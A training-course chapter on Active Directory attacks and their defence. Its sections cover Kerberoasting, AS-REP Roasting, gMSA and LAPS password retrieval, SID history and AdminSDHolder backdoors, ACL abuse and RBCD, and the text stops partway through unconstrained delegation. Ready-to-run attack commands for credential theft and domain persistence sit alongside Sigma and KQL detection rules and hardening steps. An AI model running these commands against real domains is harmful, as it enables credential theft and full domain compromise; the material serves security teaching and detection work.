---
corso: "Cybersecurity Masterclass"
fase: "Domain 14 — Active Directory & Windows Security"
modulo: "14.A"
titolo: "Active Directory Attacks"
versione: "AD DS 2025, Windows Server 2025, BloodHound CE 6.x, Impacket 0.12+, Rubeus 3.x"
livello: "Advanced"
prerequisiti:
  - "Kerberos architecture and ticket lifecycle (Domain 13 Chapter 13B §4–5)"
  - "NTLM relay, PtH/PtT/Overpass-the-Hash fundamentals"
  - "LDAP query syntax and Active Directory schema"
  - "Windows event log architecture and Sysmon configuration"
  - "Basic familiarity with PowerShell and Python offensive tooling"
obiettivi:
  - "Execute and detect Kerberoasting, AS-REP Roasting, and targeted variants using Impacket and Rubeus"
  - "Enumerate and exploit ACL abuse chains via BloodHound CE to achieve domain dominance"
  - "Perform DCSync, DCShadow, and NTDS.DIT extraction with full detection-rule coverage"
  - "Identify and exploit ADCS misconfigurations (ESC1–ESC13) using Certipy and Certify"
  - "Design and deploy a layered AD detection architecture combining Sigma rules, YARA signatures, and deception"
tag: [active-directory, kerberos, adcs, dcsync, bloodhound, sigma, credential-access, privilege-escalation, lateral-movement, detection-engineering]
---

# Domain 14, Chapter 14A — Active Directory Attacks

> **Learning Objectives.**
> After completing this chapter, the practitioner will be able to:
> 1. Enumerate and exploit Kerberos pre-authentication weaknesses (AS-REP Roasting) and SPN-based ticket extraction (Kerberoasting), including targeted weaponized variants.
> 2. Map and walk ACL-based attack paths using BloodHound CE, from initial compromise to domain dominance.
> 3. Execute credential extraction via DCSync, DCShadow, and offline NTDS.DIT parsing, and write corresponding Sigma detection rules.
> 4. Identify, exploit, and remediate ADCS certificate template misconfigurations across the ESC1-ESC13 taxonomy.
> 5. Construct a multi-layer AD detection architecture integrating event-log correlation, YARA tooling signatures, honeypot accounts, and attack-path remediation frameworks.

> **Scope.** Kerberos attack extensions (AS-REP Roasting, Kerberoasting SPN enumeration, gMSA password retrieval). SID history injection. AdminSDHolder. LAPS enumeration. ACL abuse (GenericAll, WriteDacl, WriteOwner, ForceChangePassword, AddMember). Machine account quota and RBCD. Delegation (unconstrained, constrained S4U, RBCD). Shadow Credentials (msDS-KeyCredentialLink). DCSync and DCShadow. NTDS.DIT extraction. ADCS (ESC1–ESC13). Authentication coercion (PetitPotam, PrinterBug, DFS-Coerce, ShadowCoerce). AD detection engineering (Sigma, YARA, event log correlation, honeypots). Attack path analysis (BloodHound CE, remediation frameworks). AD hardening (tiered administration, Protected Users, Credential Guard, ADCS hardening, Kerberos AES/FAST). AD forensics (ntds.dit offline analysis, replication metadata, GPO timeline, tombstone recovery, Azure AD Connect sync forensics).
>
> **Prerequisites.** Domain 13 Chapter 13B §4–5 (Kerberos architecture, Golden/Silver/Diamond Ticket, NTLM relay, PtH/PtT/Overpass-the-Hash).

---

## 1. Kerberos attack extensions

### 1.1 AS-REP Roasting

**Mechanism.** Kerberos preauthentication requires the client to encrypt a timestamp with their long-term key (derived from the user's password) in the AS-REQ. The KDC validates this timestamp before issuing a TGT. When `DONT_REQ_PREAUTH` (UAC bit 0x400000 / 4194304) is set on an account, the KDC skips this validation and returns an AS-REP containing the TGT and session key encrypted with the user's key. Any principal — including unauthenticated network access if anonymous LDAP binds are permitted — can request this AS-REP and crack the user's password offline.

The AS-REP encryption type defaults to RC4-HMAC (etype 23) unless the account or domain policy enforces AES. RC4-HMAC uses the raw NTLM hash as the key, making cracking straightforward with tools optimized for NTLM-derived ciphertexts. AES-256 (etype 18) uses a PBKDF2-derived key with 4096 iterations, significantly increasing cracking cost.

**Enumeration.**

LDAP query to find vulnerable accounts:
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

Tool-based enumeration:
```
# Impacket — enumerate without credentials (if anonymous bind permitted)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Impacket — with valid credentials, auto-enumerate all vulnerable accounts
impacket-GetNPUsers domain.local/lowprivuser:Password1 -request -dc-ip 10.0.0.1

# Rubeus — from domain-joined host
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# PowerView
Get-DomainUser -PreauthNotRequired -Properties samaccountname,memberof

# ldapsearch
ldapsearch -x -H ldap://10.0.0.1 -D "lowprivuser@domain.local" -W \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  samAccountName
```

**Exploitation.**

Step 1 — Request AS-REP for each target account:
```
impacket-GetNPUsers domain.local/ -usersfile targets.txt -format hashcat \
  -outputfile asrep.hashes -dc-ip 10.0.0.1
```

Step 2 — Crack offline. The hash format is `$krb5asrep$23$user@domain:...` for RC4:
```
hashcat -m 18200 asrep.hashes wordlist.txt -r rules/best64.rule
john --format=krb5asrep asrep.hashes --wordlist=wordlist.txt
```

Step 3 — Use recovered credentials. Depending on the account's group memberships, proceed with lateral movement, Kerberoasting with the recovered creds, or direct DA access if the account is privileged.

**Targeted AS-REP Roasting (weaponized).** An attacker with `GenericWrite` or `WriteDacl` on a target user can enable `DONT_REQ_PREAUTH`, roast the account, then disable the flag:
```
# PowerView — enable DONT_REQ_PREAUTH on target
Set-DomainObject -Identity targetuser -XOR @{userAccountControl=4194304}

# Roast
Rubeus.exe asreproast /user:targetuser /format:hashcat

# Remove the flag
Set-DomainObject -Identity targetuser -XOR @{userAccountControl=4194304}
```
This produces a window (potentially seconds) during which the flag is set. Detection must catch either the attribute change or the AS-REP without preauthentication.

**Detection.**

| Source | Event / Signal | Key Fields |
|--------|---------------|------------|
| Security log (DC) | Event ID 4768 (TGT requested) | `PreAuthType: 0` (no preauth), `TargetUserName`, `IpAddress` |
| Security log (DC) | Event ID 4738 (user account changed) | `userAccountControl` change including bit 4194304 |
| Network | AS-REQ without PA-ENC-TIMESTAMP | Kerberos protocol dissection |

Sigma rule (AS-REP Roasting detection):
```yaml
title: AS-REP Roasting — TGT Request Without Preauthentication
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: 0
  filter_machine_accounts:
    TargetUserName|endswith: '$'
  condition: selection and not filter_machine_accounts
level: high
```

Sigma rule (weaponized — flag toggle):
```yaml
title: DONT_REQ_PREAUTH Flag Toggled on User Account
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4738
  keywords:
    - "Don't Require Preauth"
  condition: selection and keywords
level: critical
```

KQL (Microsoft Sentinel):
```kql
SecurityEvent
| where EventID == 4768
| where PreAuthType == "0"
| where TargetUserName !endswith "$"
| project TimeGenerated, TargetUserName, IpAddress, ServiceName
```

**Hardening.**

1. Remove `DONT_REQ_PREAUTH` from all accounts:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} |
  Set-ADAccountControl -DoesNotRequirePreAuth $false
```

2. Enforce AES encryption for Kerberos (increases cracking cost if the flag is re-enabled):
```
GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
  Local Policies → Security Options →
  "Network security: Configure encryption types allowed for Kerberos"
  → Enable only AES128 and AES256 (disable DES, RC4)
```

3. Monitor for the flag via scheduled LDAP queries or BloodHound ingestion.

4. Enforce strong passwords (25+ characters) on any account where `DONT_REQ_PREAUTH` is a business requirement (rare — usually only for legacy Kerberos clients).

**Incident response.** If AS-REP Roasting is detected: (1) identify all accounts with `DONT_REQ_PREAUTH` set, (2) force password reset on roasted accounts immediately, (3) check if any roasted account has privileged group memberships, (4) audit authentication logs for the roasted accounts to detect credential use by the attacker, (5) remove the flag.

---

### 1.2 Kerberoasting

**Mechanism.** Any authenticated domain user can request a Kerberos TGS (Ticket Granting Service) ticket for any SPN (Service Principal Name) registered in AD. The TGS ticket's encrypted portion (the `enc-part`) is encrypted with the service account's long-term key (derived from its password via the configured etype). The attacker extracts this encrypted blob and cracks it offline.

The attack targets **user-account SPNs** specifically. Computer accounts have machine-generated 120-character random passwords that rotate every 30 days — effectively uncrackable. Service accounts set up manually by administrators often have human-chosen (weak) passwords, sometimes unchanged for years.

The encryption type matters critically: RC4-HMAC (etype 23) tickets use the raw NTLM hash as the key, crackable at ~300 GH/s on modern GPUs (RTX 4090). AES-256 (etype 18) uses PBKDF2 with 4096 iterations, reducing throughput to ~200 kH/s — roughly 1.5 million times slower to crack.

**Enumeration.**

Find user accounts with SPNs:
```
# PowerView
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof,pwdlastset

# ldapsearch
ldapsearch -H ldap://10.0.0.1 -D "user@domain.local" -W \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))" \
  samAccountName servicePrincipalName pwdLastSet memberOf

# Impacket
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1
```

Key enumeration data: `pwdLastSet` (old passwords are weaker and easier to crack), `memberOf` (prioritize accounts in privileged groups), `msDS-SupportedEncryptionTypes` (RC4-only accounts are the easiest targets).

**Exploitation.**

```
# Impacket — request all roastable tickets
impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request \
  -outputfile kerberoast.hashes

# Rubeus — from domain-joined Windows host
Rubeus.exe kerberoast /outfile:kerberoast.hashes /format:hashcat

# Rubeus — target specific high-value account
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.hash

# Rubeus — request RC4-encrypted tickets even if AES is supported
# (the KDC honors the client's etype preference)
Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast_rc4.hashes

# Crack
hashcat -m 13100 kerberoast.hashes wordlist.txt -r rules/best64.rule  # RC4 (etype 23)
hashcat -m 19700 kerberoast.hashes wordlist.txt -r rules/best64.rule  # AES-256 (etype 18)
```

**Targeted Kerberoasting (weaponized).** With `GenericWrite` on a user (who doesn't have an SPN), the attacker sets an SPN, requests the ticket, then removes the SPN:
```powershell
# Set SPN on target
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/YOURFAKE'}

# Roast
Rubeus.exe kerberoast /user:targetuser

# Remove SPN
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

**Detection.**

| Source | Event / Signal | Key Fields |
|--------|---------------|------------|
| Security log (DC) | Event ID 4769 (TGS requested) | `ServiceName` (target SPN), `TargetUserName` (requestor), `TicketEncryptionType` (0x17 = RC4), `IpAddress` |
| Security log (DC) | Event ID 4738 | SPN attribute change (targeted Kerberoasting) |
| Network | TGS-REQ volume | Many TGS-REQs from single source in short window |

Sigma rule:
```yaml
title: Kerberoasting — Excessive TGS Requests with RC4 Encryption
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  filter_machine:
    ServiceName|endswith: '$'
  condition: selection and not filter_machine | count(ServiceName) by IpAddress > 5 within 5m
level: high
```

KQL (Sentinel):
```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize DistinctSPNs = dcount(ServiceName), SPNList = make_set(ServiceName)
    by IpAddress, TargetUserName, bin(TimeGenerated, 5m)
| where DistinctSPNs > 3
```

**Hardening.**

1. Use gMSAs for all service accounts (§1.3 below) — 240-byte random passwords, auto-rotated.
2. Where gMSAs are not possible, enforce 25+ character random passwords on service accounts and rotate every 30 days.
3. Disable RC4 for Kerberos domain-wide:
```
GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
  Local Policies → Security Options →
  "Network security: Configure encryption types allowed for Kerberos"
  → AES128_HMAC_SHA1, AES256_HMAC_SHA1 only
```
4. Remove unnecessary SPNs from user accounts.
5. Monitor `pwdLastSet` — service accounts with passwords older than 90 days are high-risk targets.
6. Use Kerberos Armoring (FAST) where supported — prevents downgrade to RC4 in the TGS exchange.

**Incident response.** (1) Identify which SPNs were requested by correlating 4769 events with the attacker's source IP, (2) force immediate password reset on all targeted service accounts, (3) check for lateral movement from compromised service accounts, (4) audit SPN changes (targeted Kerberoasting indicator).

---

### 1.3 Group Managed Service Accounts (gMSA)

**Mechanism.** gMSAs have automatically-rotated 240-byte random passwords managed by Active Directory. The password is stored in the `msDS-ManagedPassword` attribute (a constructed attribute — the DC computes it on read from the stored key material). The `msDS-GroupMSAMembership` attribute contains a security descriptor defining which principals can read the password.

The password is derived using a KDF (Key Derivation Function) from a root key stored in the `msDS-KdsRootKeyId` objects in the KDS (Key Distribution Service) container. The derivation is deterministic: any DC can compute the current and previous passwords from the root key, the gMSA SID, and the current time interval (default: 30 days).

**Attack.** An attacker who compromises any principal listed in `msDS-GroupMSAMembership` can retrieve the gMSA password:

```
# Impacket — retrieve gMSA password (NTLM hash)
python3 gMSADumper.py -u compromised_host$ -p aad3b435...:ntlmhash \
  -d domain.local -l 10.0.0.1

# From Windows — DSInternals
Install-Module DSInternals
$gmsa = Get-ADServiceAccount -Identity svc_gmsa -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$secpwd = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$nthash = (ConvertTo-NTHash $secpwd)

# gMSADumper.py (standalone)
python3 gMSADumper.py -u 'user' -p 'pass' -d domain.local

# Netexec
nxc ldap dc01.domain.local -u compromised_host$ -H ntlmhash --gmsa
```

With the gMSA's NTLM hash, the attacker can use Pass-the-Hash to authenticate as the gMSA and exercise whatever privileges it holds (often local admin on member servers, SQL service accounts, etc.).

**Enumeration.** Identify gMSAs and their authorized readers:
```
# PowerView
Get-DomainObject -SearchBase "CN=Managed Service Accounts,DC=domain,DC=local" \
  -LDAPFilter "(objectClass=msDS-GroupManagedServiceAccount)" \
  -Properties samaccountname,msDS-GroupMSAMembership,msDS-ManagedPasswordInterval,memberof

# ldapsearch
ldapsearch -H ldap://10.0.0.1 -D "user@domain.local" -W \
  -b "CN=Managed Service Accounts,DC=domain,DC=local" \
  "(objectClass=msDS-GroupManagedServiceAccount)" \
  samAccountName msDS-GroupMSAMembership memberOf
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Directory Service log (DC) | Event ID 4662 | Access to `msDS-ManagedPassword` attribute (Object Type GUID `e362ed86-b728-0842-b27d-2dea7a9df218`), check `SubjectUserName` against authorized readers |
| Security log | Event ID 4624 (logon) | gMSA account authenticating from unexpected hosts |

**Hardening.** Minimize `msDS-GroupMSAMembership` to only the specific computer accounts that run the service. Do not add user accounts or broad groups. Audit the membership list regularly. Monitor gMSA logons — a gMSA authenticating from a host not in its membership list is anomalous (the host shouldn't have the password).

---

## 2. SID history and AdminSDHolder

### 2.1 SID history injection

**Mechanism.** The `sIDHistory` attribute on AD objects stores SIDs from previous domains (intended for migration scenarios). When a user authenticates, the KDC includes all SIDs from `sIDHistory` in the PAC's `KERB_SID_AND_ATTRIBUTES` array alongside the user's primary SID and group SIDs. The target service evaluates access using all SIDs in the token.

An attacker with `SeMigrateSIDHistory` privilege (or Domain Admin access) injects the SID of a privileged group (e.g., Domain Admins, Enterprise Admins, Schema Admins) into a low-privilege account's `sIDHistory`. The account then receives the privileges of that group at every authentication — without being a member of the group. This survives password resets and is invisible to tools that only check group memberships.

**Exploitation.**

```
# Mimikatz — inject SID history (requires SE_DEBUG_NAME and domain admin)
mimikatz # sid::patch
mimikatz # sid::add /sam:lowprivuser /new:S-1-5-21-...-512

# DSInternals (PowerShell) — modify sIDHistory directly
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName lowprivuser \
  -SidHistory S-1-5-21-...-512 \
  -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service ntds

# Impacket — via DCSync + offline modification (requires DRSUAPI access)
# Retrieve user object, modify sIDHistory, push via DCShadow
```

**Detection.**

| Source | Event / Signal | Details |
|--------|---------------|---------|
| Security log (DC) | Event ID 4765 | SID history added to an account |
| Security log (DC) | Event ID 4766 | SID history add attempt failed |
| Periodic audit | LDAP query | `(&(objectClass=user)(sIDHistory=*))` — any account with sIDHistory in a single-domain forest is suspicious |
| Network | PAC inspection | SIDs in the PAC that don't match group memberships |

Sigma rule:
```yaml
title: SID History Injection Detected
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4765
      - 4766
  condition: selection
level: critical
```

**Hardening.**

1. Enable SID Filtering on all trust boundaries:
```powershell
netdom trust domain.local /domain:partner.local /quarantine:yes
```
SID Filtering strips SIDs from another domain's trusted forest out of the PAC at trust boundaries. Within a single forest, SID Filtering is not applied by default between child/parent domains — this is a design limitation.

2. Audit `sIDHistory` attribute across all accounts regularly:
```powershell
Get-ADUser -Filter {sIDHistory -like "*"} -Properties sIDHistory |
  Select-Object Name, sIDHistory
```

3. In environments that have never performed a domain migration, `sIDHistory` on any user account is anomalous — alert immediately.

4. Use Protected Users group for privileged accounts (PAC is restricted, reducing some SID history attack vectors).

### 2.2 AdminSDHolder

**Mechanism.** AdminSDHolder is a special AD object (`CN=AdminSDHolder,CN=System,DC=domain,DC=local`) whose DACL is propagated by the SDProp (Security Descriptor Propagation) process to all "protected" objects every 60 minutes. Protected objects include members of: Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Server Operators, Print Operators, Backup Operators, Replicator, Domain Controllers, Read-Only Domain Controllers, and any group whose `adminCount=1`.

**Attack.** An attacker with `WriteDacl` on AdminSDHolder adds a permissive ACE (e.g., granting a controlled account `GenericAll`). Within 60 minutes, SDProp propagates this ACE to all protected objects. The attacker now has `GenericAll` on every Domain Admin, Enterprise Admin, and all other protected accounts. This persists because:
- Manual ACL remediation on individual protected accounts is overwritten by SDProp within an hour
- The backdoor ACE on AdminSDHolder itself must be found and removed
- `adminCount=1` accounts that are later removed from privileged groups retain the modified ACL (SDProp doesn't clean up)

**Exploitation.**
```powershell
# PowerView — add ACE to AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' \
  -PrincipalIdentity backdooruser -Rights All

# Wait up to 60 minutes for SDProp propagation (or force it)
# Force SDProp manually:
Invoke-SDPropagator  # PowerView function
# Or: run "dsmod" from DC, or trigger via "RunProtectAdminGroupsTask" scheduled task
```

After propagation, `backdooruser` has `GenericAll` on all Domain Admins → can reset any DA password → full domain compromise.

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 5136 | Attribute `nTSecurityDescriptor` changed on `CN=AdminSDHolder` |
| Periodic audit | ACL comparison | Compare current AdminSDHolder DACL against known-good baseline |
| BloodHound | Outbound control from non-T0 accounts | Any non-Tier-0 account with permissions on AdminSDHolder |

Sigma rule:
```yaml
title: AdminSDHolder ACL Modified
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectDN|contains: 'CN=AdminSDHolder,CN=System'
    AttributeLDAPDisplayName: nTSecurityDescriptor
  condition: selection
level: critical
```

**Hardening.**

1. Monitor AdminSDHolder ACL with a scheduled script that compares against a hardened baseline.
2. Restrict `WriteDacl` on AdminSDHolder to Domain Admins only (audit the current DACL).
3. Identify and investigate orphaned `adminCount=1` accounts (accounts no longer in privileged groups but retaining the SDProp-applied ACL):
```powershell
Get-ADUser -Filter {adminCount -eq 1} -Properties memberOf |
  Where-Object { -not ($_.memberOf -match 'Domain Admins|Enterprise Admins|Administrators') }
```

---

## 3. LAPS

**Mechanism.** LAPS (Local Administrator Password Solution) stores unique, randomly generated local administrator passwords in AD attributes on computer objects. Legacy LAPS uses `ms-Mcs-AdmPwd` (plaintext) and `ms-Mcs-AdmPwdExpirationTime`. Windows LAPS (April 2023+) uses `msLAPS-Password` (plaintext JSON), `msLAPS-EncryptedPassword` (encrypted blob), and `msLAPS-PasswordExpirationTime`. The encrypted variant uses a designated principal's public key for encryption.

Access control: the LAPS attributes are protected by ACLs on each computer object. Only principals with explicit read permission on the LAPS attribute can retrieve the password. By default, Domain Admins and the LAPS management tier have read access.

**Attack.** The attacker enumerates which principals can read LAPS passwords, compromises one of those principals, then reads all LAPS passwords in the domain:

```
# PowerView — find computers where current user can read LAPS
Get-DomainComputer -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime |
  Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }

# Netexec — read LAPS passwords from all reachable computers
nxc ldap dc01.domain.local -u user -p pass --laps

# LAPSToolkit
Get-LAPSComputers       # Find computers with LAPS enabled
Find-LAPSDelegatedGroups # Find groups with LAPS read permissions
Get-LAPSPasswords        # Dump passwords (if authorized)

# PowerShell AD module (Windows LAPS)
Get-ADComputer -Filter * -Properties msLAPS-Password |
  Select-Object Name, @{N='Password';E={$_.'msLAPS-Password'}}

# ldapsearch
ldapsearch -H ldap://10.0.0.1 -D "user@domain.local" -W \
  -b "DC=domain,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

**Enumeration of LAPS read permissions.**
```powershell
# Find who can read LAPS passwords on each OU
Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"

# BloodHound — query for ReadLAPSPassword edges
MATCH p=(n)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Directory Service log | Event ID 4662 | Access to `ms-Mcs-AdmPwd` or `msLAPS-Password` attribute. Check `SubjectUserName` against expected LAPS administrators |
| Audit | Permission enumeration | Unusual accounts querying LAPS attributes across many computers |

KQL:
```kql
SecurityEvent
| where EventID == 4662
| where ObjectType contains "ms-Mcs-AdmPwd" or ObjectType contains "msLAPS"
| project TimeGenerated, SubjectUserName, SubjectDomainName, ObjectName
| summarize ReadCount = count() by SubjectUserName, bin(TimeGenerated, 1h)
| where ReadCount > 10
```

**Hardening.**

1. Restrict LAPS read access to dedicated LAPS admin groups per OU — not Domain Admins globally.
2. Use Windows LAPS with encrypted passwords (`msLAPS-EncryptedPassword`) where possible.
3. Enable LAPS audit logging (requires configuring Directory Service Access auditing on computer objects).
4. Set short password expiration (e.g., 24 hours for high-value servers).
5. Monitor for bulk LAPS reads (more than a few computers in a short window is anomalous for legitimate admin use).

---

## 4. ACL abuse

### 4.1 Dangerous ACE types

AD objects have DACLs (Discretionary Access Control Lists) composed of ACEs (Access Control Entries). Several ACE types enable direct privilege escalation:

| ACE Right | Effect on User Object | Effect on Computer Object | Effect on Group Object |
|-----------|----------------------|--------------------------|----------------------|
| **GenericAll** | Reset password, write any attribute (SPN → Kerberoast, KeyCredentialLink → Shadow Creds), add to any group | Write any attribute (RBCD, KeyCredentialLink), read LAPS | Add/remove members |
| **GenericWrite** | Write any attribute (same as GenericAll minus password reset and full control) | Same as above | Modify attributes |
| **WriteOwner** | Take ownership → then grant self GenericAll | Same | Same |
| **WriteDacl** | Modify DACL → grant self any permission | Same | Same |
| **ForceChangePassword** | Reset password without knowing current password | N/A (computer passwords are set differently) | N/A |
| **AddMember** (Self) | N/A | N/A | Add yourself to the group |
| **AllExtendedRights** | Reset password (includes ForceChangePassword) + read LAPS + read gMSA passwords | Read LAPS | N/A |
| **WriteProperty on specific attributes** | Depends: `servicePrincipalName` → targeted Kerberoast, `msDS-KeyCredentialLink` → Shadow Credentials, `member` → group membership | `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD | `member` → add members |

### 4.2 ACL attack chains

BloodHound ingests AD data (via SharpHound or azurehound) and builds a directed graph of all ACL relationships, group memberships, sessions, and trust boundaries. The attacker queries for the shortest path from their compromised principal to Domain Admin:

```
# SharpHound collection
SharpHound.exe --CollectionMethods All --Domain domain.local

# BloodHound Cypher query — shortest path from owned principal to DA
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

# Find all principals with GenericAll on Domain Admins group
MATCH (n)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN n
```

**Walking the chain — concrete example:**

1. Compromised user `jsmith` has `GenericWrite` on user `svc_backup`
2. `svc_backup` is member of `Backup Operators`
3. `Backup Operators` has `GenericAll` on `Domain Admins` group

Attack execution:
```
# Step 1: Set SPN on svc_backup (targeted Kerberoast)
Set-DomainObject -Identity svc_backup -Set @{serviceprincipalname='fake/kerberoast'}
Rubeus.exe kerberoast /user:svc_backup
# Crack password offline
Set-DomainObject -Identity svc_backup -Clear serviceprincipalname

# Step 2: Authenticate as svc_backup
# Step 3: As svc_backup (Backup Operators member with GenericAll on DA group):
Add-DomainGroupMember -Identity "Domain Admins" -Members controlleduser
```

### 4.3 Security descriptor persistence

The most dangerous ACL abuse is modifying the DACL on the domain root object:
```powershell
# Grant controlled account DCSync rights permanently
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity backdooruser \
  -Rights DCSync

# Or grant GenericAll on the entire domain
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
  -PrincipalIdentity backdooruser \
  -Rights All
```

This survives: password resets, account disabling/re-enabling, group membership changes, Golden Ticket rotation (krbtgt reset), and most remediation playbooks. The only fix is finding and removing the ACE.

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| Security log (DC) | Event ID 5136 | Attribute `nTSecurityDescriptor` modified on sensitive objects |
| Security log (DC) | Event ID 4738 | `servicePrincipalName` changed (targeted Kerberoast) |
| BloodHound | Dangerous ACL edges | Non-T0 principals with control over T0 objects |
| Periodic ACL audit | Baseline diff | Compare DACLs on domain root, AdminSDHolder, GPO objects, privileged groups against known-good |

Sigma rule:
```yaml
title: ACL Modification on Domain Root or Privileged Objects
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: nTSecurityDescriptor
  filter_sensitive_objects:
    ObjectDN|contains:
      - 'DC=domain,DC=local'
      - 'CN=AdminSDHolder'
      - 'CN=Domain Admins'
      - 'CN=Enterprise Admins'
  condition: selection and filter_sensitive_objects
level: critical
```

**Hardening.**

1. Enable Directory Service Access auditing:
```
GPO: Computer Configuration → Policies → Windows Settings → Security Settings →
  Advanced Audit Policy Configuration → DS Access →
  Audit Directory Service Changes: Success, Failure
```

2. Run periodic ACL audits. Tools: `Invoke-ACLScanner` (PowerView), BloodHound, PingCastle, Purple Knight.
3. Implement tiered administration (Tier 0/1/2) — T0 accounts and objects should only be controlled by other T0 entities.
4. Restrict who can modify DACLs on the domain root, AdminSDHolder, and GPO objects.
5. Use Protected Users group for privileged accounts.

---

## 5. Machine account quota and delegation

### 5.1 Machine account quota

**Mechanism.** The `ms-DS-MachineAccountQuota` attribute on the domain root (default: **10**) specifies how many computer accounts a regular user can create. The creator gets `GenericAll` on the created computer, including the ability to set delegation attributes, SPNs, and the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

```
# Check current quota
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) \
  -Properties ms-DS-MachineAccountQuota | Select ms-DS-MachineAccountQuota

# Create a machine account
impacket-addcomputer domain.local/user:pass -computer-name FAKECOMP$ \
  -computer-pass FakePass123 -dc-ip 10.0.0.1

# Or via PowerShell
New-ADComputer -Name "FAKECOMP" -SamAccountName "FAKECOMP$" \
  -AccountPassword (ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Enabled $true

# Or via PowerMad
New-MachineAccount -MachineAccount FAKECOMP -Password $(ConvertTo-SecureString 'FakePass123' -AsPlainText -Force)
```

**Hardening.** Set quota to 0:
```powershell
Set-ADDomain -Identity domain.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

### 5.2 Resource-Based Constrained Delegation (RBCD)

**Mechanism.** RBCD allows a computer to declare which other computers can impersonate users to it, via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. The S4U (Service for User) protocol extensions handle the impersonation:

1. **S4U2Self**: The attacker's controlled computer requests a service ticket to itself on behalf of a target user (e.g., Domain Admin). The KDC issues a forwardable ticket (for RBCD).
2. **S4U2Proxy**: The controlled computer presents this ticket to the KDC and requests a service ticket to the target computer on behalf of the impersonated user. Because the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` lists the attacker's computer, the KDC grants the ticket.

Result: the attacker has a service ticket to the target computer as Domain Admin.

**Full RBCD attack chain:**

```
# Step 1: Create machine account (or use already-compromised one)
impacket-addcomputer domain.local/user:pass -computer-name FAKECOMP$ \
  -computer-pass FakePass123 -dc-ip 10.0.0.1

# Step 2: Set RBCD on target (requires GenericWrite on target computer)
# Via Impacket
impacket-rbcd domain.local/user:pass -delegate-from 'FAKECOMP$' \
  -delegate-to 'TARGET$' -action write -dc-ip 10.0.0.1

# Via PowerShell
$sid = (Get-ADComputer FAKECOMP).SID
$sd = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
$bytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($bytes, 0)
Set-ADComputer TARGET -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$bytes}

# Step 3: S4U2Self + S4U2Proxy to get ticket as admin to target
impacket-getST domain.local/FAKECOMP$:FakePass123 -spn cifs/TARGET.domain.local \
  -impersonate Administrator -dc-ip 10.0.0.1

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec domain.local/Administrator@TARGET.domain.local -k -no-pass
```

### 5.3 Unconstrained delegation

**Mechanism.** A server with `TrustedForDelegation` (the `TRUSTED_FOR_DELEGATION` UAC flag) receives the connecting user's TGT in the AP-REQ's authenticator. The server caches this TGT and can use it to access any service as the user.

**Attack.** Compromise a host with unconstrained delegation → extract cached TGTs from memory → impersonate any user who connected.

```
# Enumerate unconstrained delegation hosts
Get-DomainComputer -Unconstrained -Properties samaccountname,dnshostname

# Rubeus — monitor for incoming TGTs on compromised unconstrained delegation host
Rubeus.exe monitor /interval:5 /nowrap

# Force a DC to connect (via authentication coercion — §10)
SpoolSample.exe DC01.domain.local COMPROMISED.domain.local

